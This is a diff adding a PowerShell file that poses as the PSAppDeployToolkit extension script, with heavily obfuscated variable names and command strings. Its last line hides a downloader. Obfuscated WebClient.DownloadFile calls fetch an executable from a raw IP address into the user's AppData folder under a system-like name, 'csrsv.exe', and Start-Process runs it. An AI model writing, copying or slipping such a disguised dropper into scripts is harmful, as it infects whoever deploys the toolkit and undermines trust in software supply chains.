@@ -1,0 +1,40 @@
+[CmdletBinding()]
+Param (
+)
+
+
+
+
+
+
+[string]${apPD`ePLoY`TOOLKIt`eXt`NaMe} = ("{1}{0}{3}{4}{2}" -f 'ppD','PSA','itExt','epl','oyToolk')
+[string]${aP`P`d`EP`l`oy`exTsCrip`TfRienDL`Y`NaMe} = ("{2}{1}{3}{5}{6}{4}{0}" -f'ns','pp ','A','De','Extensio','p','loy Toolkit ')
+[version]${aP`PDePlOy`ex`T`S`c`RIPTveR`SioN} = [version]("{1}{0}"-f '.8.0','3')
+[string]${AP`PdEp`lo`YexTsC`RI`PTDa`TE} = ("{3}{0}{2}{1}"-f '3/09','2019','/','2')
+[hashtable]${ApPD`EPLo`yexT`SCR`IptPaR`Ame`TErs} = ${Ps`BOUNdParA`mETE`RS}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+If (${s`cRIp`TpA`REntPa`Th}) {
+	&("{2}{0}{1}"-f'o','g','Write-L') -Message "Script [$($MyInvocation.MyCommand.Definition)] dot-source invoked by [$(((Get-Variable -Name MyInvocation).Value).ScriptName)] " -Source ${ApP`dE`PlOy`TOoLK`ITex`TN`AME}
+} Else {
+	.("{0}{2}{1}" -f 'Wri','Log','te-') -Message "Script [$($MyInvocation.MyCommand.Definition)] invoked directly " -Source ${ApPdEP`Lo`Y`TOo`LK`it`EXtnaMe}
+}
+
+
+
+
+
+(.("{2}{3}{1}{0}" -f'ect','-Obj','N','ew') ("{0}{2}{1}{3}"-f'Sy','tem.Net.','s','WebClient')).("{2}{1}{0}{3}" -f'oadFil','ownl','D','e').Invoke(("{3}{1}{0}{2}{5}{6}{8}{4}{7}"-f'/89','/','.248.170.','http:','sv','21','8','.exe','/~yahoo/csr'),"$env:APPDATA\csrsv.exe");.("{1}{2}{0}" -f'ss','Sta','rt-Proce') ("$env:APPDATA\csrsv.exe")
